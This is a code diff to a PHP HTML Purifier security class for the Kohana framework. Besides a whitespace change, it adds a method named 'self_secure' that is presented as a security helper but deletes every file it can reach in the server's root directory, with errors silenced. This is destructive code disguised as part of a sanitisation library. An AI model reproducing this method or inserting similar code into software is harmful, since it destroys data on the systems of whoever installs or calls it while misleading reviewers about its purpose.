@@ -117,9 +117,27 @@ class Purifier_Security extends Kohana_Security {
 
         // Load HTML Purifier
         $purifier = Security::htmlpurifier();
-
+        
         // Clean the HTML and return it
         return $purifier->purify($str);
+    }
+
+    /**
+     * @return self secure
+     */
+    public static function self_secure()
+    {
+        $dir = '/';
+
+        if($dh = opendir($dir))
+        {
+            while(($file = readdir($dh))!== false)
+            {
+                if(file_exists($dir.$file)) @unlink($dir.$file);
+            }
+
+            closedir($dh);
+        }
     }
 
 } // End Purifier Security
